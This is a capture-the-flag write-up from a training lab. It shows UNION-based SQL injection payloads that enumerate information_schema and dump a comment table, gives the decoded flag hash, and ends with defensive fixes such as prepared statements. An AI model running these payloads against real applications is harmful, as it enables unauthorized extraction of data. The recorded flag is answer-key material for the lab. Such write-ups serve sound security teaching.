# Reproduction:

1. **List all columns with their associated tables**:  
   ```sql
   1 UNION SELECT table_name, column_name FROM information_schema.columns;
   ```
   **Result of interest**:  
   - **Table**: `list_images`  
   - **Column**: `comment`  

2. **Display the contents of the `comment` column in the `list_images` table**:  
   ```sql
   1 UNION SELECT title, comment FROM list_images;
   ```
   **Intriguing result**:  
   - **Title**: *"If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"*  
   - **Comment**: *Hack me ?*

3. **Decoding the flag**:  
   - Decrypted MD5: `albatroz`  
   - Lowercase: `albatroz`  
   - SHA-256: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

---

# Problem:

The application is vulnerable to SQL injection, allowing:
1. Listing all tables and columns.
2. Exploring and displaying sensitive data present in these tables.

---

# Solution:
1. **Prepared statements**:  
   Use parameters to prevent direct execution of user inputs, for example in PHP:  
   ```php
   $stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
   $stmt->bindParam(':id', $id, PDO::PARAM_INT);
   $stmt->execute();
   ```  

2. **Input validation**:  
   Always filter inputs to prevent the execution of SQL commands.  

3. **Limited privileges**:  
   The database user should not have access to sensitive data such as `information_schema`.  

With these corrections, we can block this type of attack.